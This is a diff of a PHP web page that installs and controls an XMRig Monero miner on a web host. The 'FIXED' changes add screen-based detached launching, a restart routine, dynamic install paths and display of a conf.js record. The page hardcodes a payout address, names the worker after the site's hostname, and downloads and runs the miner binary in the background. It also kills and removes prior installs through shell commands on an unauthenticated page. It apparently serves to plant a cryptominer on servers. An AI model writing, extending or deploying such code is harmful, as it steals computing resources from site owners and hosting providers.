@@ -1,11 +1,19 @@
 <?php
 // Set default Monero address
- $defaultAddress = "83c4H4wjx8qLTqpUUGdCQE9hM2SwxcukTLFd29PtUrWpby4CXohXYoLQBBrwpYrDfUapxAgenNr2iG847x7wRazPH2RH6nm"; 
+ $defaultAddress = "83c4H4wjx8qLTqpUUGdCQE9hM2SwxcukTLFd29PtUrWpby4CXohXYoLQBBrwpYrDfUapxAgenNr2iG847x7wRazPH2RH6nm";
 
 // Get custom address from URL parameter if provided
  $address = isset($_GET['address']) ? $_GET['address'] : $defaultAddress;
 
 // --- Helper Functions ---
+
+/**
+ * Checks if a command exists on the system.
+ */
+function isCommandAvailable($command) {
+    $output = shell_exec("command -v " . escapeshellarg($command));
+    return !empty(trim($output));
+}
 
 /**
  * Executes a shell command using the best available method.
@@ -51,7 +59,7 @@ function rrmdir($dir) {
 }
 
 /**
- * Finds the path of an existing installation.
+ * FIXED: Finds the path of an existing installation using a dynamic path.
  */
 function findExistingInstallationPath() {
     $homeEnv = trim(executeCommand('printenv HOME'));
@@ -59,16 +67,18 @@ function findExistingInstallationPath() {
         $path = $homeEnv . '/moneroocean';
         if (is_dir($path)) return $path;
     }
-    $path = '/home/user/tmp/xmrig-6.24.0'; // Using the example path
+    // FIXED: Use a dynamic path instead of a hardcoded one.
+    $baseDir = dirname($_SERVER['DOCUMENT_ROOT']);
+    $path = $baseDir . '/tmp/xmrig-6.24.0';
     if (is_dir($path)) return $path;
     return false;
 }
 
 /**
- * Gets detailed status of the miner process, including config details.
+ * FIXED: Gets detailed status, including config and conf.js details.
  */
 function getMinerStatus() {
-    $status = ['running' => false, 'method' => 'none', 'details' => [], 'config' => null, 'path' => null];
+    $status = ['running' => false, 'method' => 'none', 'details' => [], 'config' => null, 'path' => null, 'confjs' => null];
     $processOutput = executeCommand("ps aux | grep '[x]mrig'");
 
     if (!empty($processOutput)) {
@@ -96,6 +106,12 @@ function getMinerStatus() {
                 $status['config']['workername'] = $config['pools'][0]['pass'];
             }
         }
+        // FIXED: Re-added logic to get conf.js details.
+        $confJsPath = $installationPath . '/conf.js';
+        if (file_exists($confJsPath)) {
+            $status['confjs']['path'] = $confJsPath;
+            $status['confjs']['content'] = htmlspecialchars(file_get_contents($confJsPath));
+        }
     }
     return $status;
 }
@@ -110,26 +126,32 @@ function createConfJs($path, $address) {
 }
 
 /**
- * Modifies the config.json file.
+ * FIXED: Modifies the config.json file with the correct worker name logic.
  */
 function modifyConfig($configPath, $address) {
     $config = json_decode(file_get_contents($configPath), true);
     if ($config === null) return false;
     $config['pools'][0]['url'] = "gulf.moneroocean.stream:10128";
     $config['pools'][0]['user'] = $address;
-    $config['pools'][0]['pass'] = $_SERVER['HTTP_HOST'] ?: 'worker';
+    // FIXED: Added str_replace to change '-' to '.' in the worker name.
+    $config['pools'][0]['pass'] = str_replace('-', '.', $_SERVER['HTTP_HOST'] ?: 'worker');
     $config['log-file'] = null;
     file_put_contents($configPath, json_encode($config, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES));
     return true;
 }
 
 /**
- * Starts the miner using nohup.
+ * FIXED: Starts the miner, prioritizing 'screen' over 'nohup'.
  */
 function startMiner($path) {
-    $command = "cd $path && nohup ./xmrig > bot.log 2>&1 & disown";
-    executeCommand($command);
-    echo "<p style='color: blue;'>🚀 Miner start command executed in $path</p>";
+    $screenSessionName = 'xmrig_miner';
+    if (isCommandAvailable('screen')) {
+        $command = "screen -dmS '$screenSessionName' bash -c 'cd $path && ./xmrig'";
+        executeCommand($command);
+    } else {
+        $command = "cd $path && nohup ./xmrig > bot.log 2>&1 & disown";
+        executeCommand($command);
+    }
 }
 
 // --- HTML Start ---
@@ -145,161 +167,29 @@ function startMiner($path) {
     <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap" rel="stylesheet">
     <style>
         :root {
-            --primary-color: #6366f1;
-            --primary-dark: #4f46e5;
-            --success-color: #10b981;
-            --warning-color: #f59e0b;
-            --danger-color: #ef4444;
-            --bg-color: #0f172a;
-            --surface-color: #1e293b;
-            --text-color: #e2e8f0;
-            --text-muted: #94a3b8;
-            --border-color: #334155;
+            --primary-color: #6366f1; --primary-dark: #4f46e5; --success-color: #10b981; --warning-color: #f59e0b; --danger-color: #ef4444;
+            --bg-color: #0f172a; --surface-color: #1e293b; --text-color: #e2e8f0; --text-muted: #94a3b8; --border-color: #334155;
         }
-
-        body {
-            font-family: 'Poppins', sans-serif;
-            background-color: var(--bg-color);
-            color: var(--text-color);
-            margin: 0;
-            padding: 20px;
-            line-height: 1.6;
-        }
-
-        .container {
-            max-width: 1000px;
-            margin: 20px auto;
-            background-color: var(--surface-color);
-            padding: 30px;
-            border-radius: 12px;
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
-            border: 1px solid var(--border-color);
-        }
-
-        .header {
-            text-align: center;
-            margin-bottom: 30px;
-            padding-bottom: 20px;
-            border-bottom: 1px solid var(--border-color);
-        }
-
-        .header h1 {
-            font-size: 2.5rem;
-            font-weight: 700;
-            color: var(--text-color);
-            margin: 0;
-        }
-
-        .header p {
-            color: var(--text-muted);
-            font-size: 1.1rem;
-            margin-top: 5px;
-        }
-
-        .card {
-            background-color: rgba(30, 41, 59, 0.5);
-            border: 1px solid var(--border-color);
-            border-radius: 8px;
-            padding: 20px;
-            margin-bottom: 20px;
-        }
-
-        .card-title {
-            font-size: 1.25rem;
-            font-weight: 600;
-            margin-top: 0;
-            margin-bottom: 15px;
-            display: flex;
-            align-items: center;
-        }
-
-        .card-title .icon {
-            margin-right: 10px;
-            font-size: 1.5rem;
-        }
-
-        .status-running .card-title { color: var(--success-color); }
-        .status-stopped .card-title { color: var(--warning-color); }
-        .status-error .card-title { color: var(--danger-color); }
-        .status-info .card-title { color: var(--primary-color); }
-
-        .status-table {
-            width: 100%;
-            border-collapse: collapse;
-            margin-top: 15px;
-        }
-
-        .status-table th, .status-table td {
-            padding: 12px 15px;
-            text-align: left;
-            border-bottom: 1px solid var(--border-color);
-        }
-
-        .status-table th {
-            font-weight: 600;
-            color: var(--text-muted);
-            background-color: rgba(15, 23, 42, 0.5);
-        }
-
-        .status-table td {
-            font-family: 'Courier New', Courier, monospace;
-            word-break: break-all;
-        }
-
-        code {
-            background-color: rgba(99, 102, 241, 0.2);
-            color: var(--primary-color);
-            padding: 3px 8px;
-            border-radius: 4px;
-            font-family: 'Courier New', Courier, monospace;
-            font-size: 0.9em;
-        }
-
-        pre {
-            background-color: var(--bg-color);
-            border: 1px solid var(--border-color);
-            padding: 15px;
-            border-radius: 6px;
-            overflow-x: auto;
-            white-space: pre-wrap;
-            font-size: 0.9em;
-        }
-
-        .button {
-            display: inline-block;
-            padding: 12px 25px;
-            font-size: 1rem;
-            font-weight: 600;
-            color: white;
-            text-align: center;
-            text-decoration: none;
-            border-radius: 6px;
-            transition: all 0.3s ease;
-            border: none;
-            cursor: pointer;
-        }
-
-        .button-success { background-color: var(--success-color); }
-        .button-success:hover { background-color: #059669; transform: translateY(-2px); }
-        .button-danger { background-color: var(--danger-color); }
-        .button-danger:hover { background-color: #dc2626; transform: translateY(-2px); }
-
-        .spinner {
-            border: 4px solid var(--border-color);
-            border-top: 4px solid var(--primary-color);
-            border-radius: 50%;
-            width: 24px;
-            height: 24px;
-            animation: spin 1s linear infinite;
-            display: inline-block;
-            vertical-align: middle;
-            margin-right: 10px;
-        }
-
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
+        body { font-family: 'Poppins', sans-serif; background-color: var(--bg-color); color: var(--text-color); margin: 0; padding: 20px; line-height: 1.6; }
+        .container { max-width: 1000px; margin: 20px auto; background-color: var(--surface-color); padding: 30px; border-radius: 12px; box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3); border: 1px solid var(--border-color); }
+        .header { text-align: center; margin-bottom: 30px; padding-bottom: 20px; border-bottom: 1px solid var(--border-color); }
+        .header h1 { font-size: 2.5rem; font-weight: 700; color: var(--text-color); margin: 0; }
+        .header p { color: var(--text-muted); font-size: 1.1rem; margin-top: 5px; }
+        .card { background-color: rgba(30, 41, 59, 0.5); border: 1px solid var(--border-color); border-radius: 8px; padding: 20px; margin-bottom: 20px; }
+        .card-title { font-size: 1.25rem; font-weight: 600; margin-top: 0; margin-bottom: 15px; display: flex; align-items: center; }
+        .card-title .icon { margin-right: 10px; font-size: 1.5rem; }
+        .status-running .card-title { color: var(--success-color); } .status-stopped .card-title { color: var(--warning-color); } .status-error .card-title { color: var(--danger-color); } .status-info .card-title { color: var(--primary-color); }
+        .status-table { width: 100%; border-collapse: collapse; margin-top: 15px; }
+        .status-table th, .status-table td { padding: 12px 15px; text-align: left; border-bottom: 1px solid var(--border-color); }
+        .status-table th { font-weight: 600; color: var(--text-muted); background-color: rgba(15, 23, 42, 0.5); }
+        .status-table td { font-family: 'Courier New', Courier, monospace; word-break: break-all; }
+        code { background-color: rgba(99, 102, 241, 0.2); color: var(--primary-color); padding: 3px 8px; border-radius: 4px; font-family: 'Courier New', Courier, monospace; font-size: 0.9em; }
+        pre { background-color: var(--bg-color); border: 1px solid var(--border-color); padding: 15px; border-radius: 6px; overflow-x: auto; white-space: pre-wrap; font-size: 0.9em; }
+        .button { display: inline-block; padding: 12px 25px; font-size: 1rem; font-weight: 600; color: white; text-align: center; text-decoration: none; border-radius: 6px; transition: all 0.3s ease; border: none; cursor: pointer; }
+        .button-success { background-color: var(--success-color); } .button-success:hover { background-color: #059669; transform: translateY(-2px); }
+        .button-danger { background-color: var(--danger-color); } .button-danger:hover { background-color: #dc2626; transform: translateY(-2px); }
+        .spinner { border: 4px solid var(--border-color); border-top: 4px solid var(--primary-color); border-radius: 50%; width: 24px; height: 24px; animation: spin 1s linear infinite; display: inline-block; vertical-align: middle; margin-right: 10px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
@@ -313,6 +203,39 @@ function startMiner($path) {
 
 // --- Main Logic ---
 
+// FIXED: Re-added the improved restart logic.
+if (isset($_GET['restart'])) {
+    echo "<div class='card status-info'>";
+    echo "<h2 class='card-title'><span class='icon'>🔄</span> Restart Requested</h2>";
+    $minerPath = findExistingInstallationPath();
+    if ($minerPath) {
+        echo "<p>Found installation at <code>" . htmlspecialchars($minerPath) . "</code>.</p>";
+        echo "<h3>Step 1: Checking Permissions</h3>";
+        executeCommand("chmod +x '$minerPath/xmrig'");
+        echo "<p>✅ Set execute permissions on xmrig.</p>";
+        echo "<h3>Step 2: Starting Miner</h3>";
+        $logFile = $minerPath . '/bot.log';
+        if(file_exists($logFile)) unlink($logFile);
+        startMiner($minerPath);
+        echo "<p style='color: blue;'>🚀 Start command executed. Waiting for process to initialize...</p>";
+        echo "<h3>Step 3: Checking for Errors</h3>";
+        sleep(3);
+        flush(); ob_flush();
+        if (file_exists($logFile) && filesize($logFile) > 0) {
+            $logContent = file_get_contents($logFile);
+            echo "<p style='color: var(--danger-color);'>⚠️ The miner process may have failed to start. Check the log output below:</p>";
+            echo "<pre>" . htmlspecialchars($logContent) . "</pre>";
+        } else {
+            echo "<p style='color: var(--success-color);'>✅ No immediate errors found in log file.</p>";
+        }
+        echo "<p><a href='?' class='button button-success'>Refresh Page to Check Status</a></p>";
+    } else {
+        echo "<p style='color:red;'>❌ Could not find an existing installation to restart.</p>";
+    }
+    echo "</div></body></html>";
+    exit;
+}
+
 if (isset($_GET['address'])) {
     echo "<div class='card status-info'>";
     echo "<h2 class='card-title'><span class='icon'>🔄</span> Address Change Detected</h2>";
@@ -320,14 +243,12 @@ if (isset($_GET['address'])) {
     echo "<div class='spinner'></div> <span>Processing...</span>";
     echo "</div>";
     flush(); ob_flush();
-
     $oldPath = findExistingInstallationPath();
     if ($oldPath) {
         executeCommand("pkill -f xmrig");
         sleep(2);
         rrmdir($oldPath);
     }
-    // Script will proceed to fresh install below.
 }
 
  $minerStatus = getMinerStatus();
@@ -353,6 +274,12 @@ if ($minerStatus['running']) {
         echo "<tr><th>Worker Name</th><td>" . htmlspecialchars($minerStatus['config']['workername']) . "</td></tr>";
     }
     echo "</table>";
+    // FIXED: Re-added conf.js display block.
+    if ($minerStatus['confjs']) {
+        echo "<h3 style='margin-top: 20px;'>Configuration Record (conf.js)</h3>";
+        echo "<p><strong>File Location:</strong> <code>" . htmlspecialchars($minerStatus['confjs']['path']) . "</code></p>";
+        echo "<pre>" . $minerStatus['confjs']['content'] . "</pre>";
+    }
     echo "</div>";
     echo "</div></body></html>";
     exit;
@@ -367,6 +294,12 @@ if ($installationPath) {
     if ($minerStatus['config']) {
         echo "<p><strong>Last Known Address:</strong> <code>" . htmlspecialchars($minerStatus['config']['address']) . "</code></p>";
         echo "<p><strong>Worker Name:</strong> " . htmlspecialchars($minerStatus['config']['workername']) . "</p>";
+    }
+    // FIXED: Re-added conf.js display block.
+    if ($minerStatus['confjs']) {
+        echo "<h3 style='margin-top: 20px;'>Configuration Record (conf.js)</h3>";
+        echo "<p><strong>File Location:</strong> <code>" . htmlspecialchars($minerStatus['confjs']['path']) . "</code></p>";
+        echo "<pre>" . $minerStatus['confjs']['content'] . "</pre>";
     }
     echo "<a href='?restart=true' class='button button-success'>▶️ Start Miner Now</a>";
     echo "</div>";
@@ -393,11 +326,12 @@ if (!empty($homeEnv)) {
         echo "<div class='card status-running'><h2 class='card-title'><span class='icon'>✅</span> Installation Complete!</h2></div>";
     } else { echo "<div class='card status-error'><h2 class='card-title'><span class='icon'>❌</span> Installation Failed</h2></div>"; }
 } else {
+    // FIXED: Use dynamic path for manual installation.
     $baseDir = dirname($_SERVER['DOCUMENT_ROOT']);
     $tmpDir = $baseDir . '/tmp';
     $installDir = $tmpDir . '/xmrig-6.24.0';
     echo "<div class='card status-warning'><p>⚠️ Using Manual method in <code>$installDir</code></p></div>";
-    if (!is_dir($tmpDir)) { mkdir($tmpDir, 0775, true); }
+    if (!is_dir($tmpDir)) { mkdir($tmpDir, 0755, true); }
     file_put_contents($tmpDir . '/xmrig.tar.gz', fopen('https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-linux-static-x64.tar.gz', 'r'));
     $phar = new PharData($tmpDir . '/xmrig.tar.gz');
     $phar->extractTo($tmpDir);
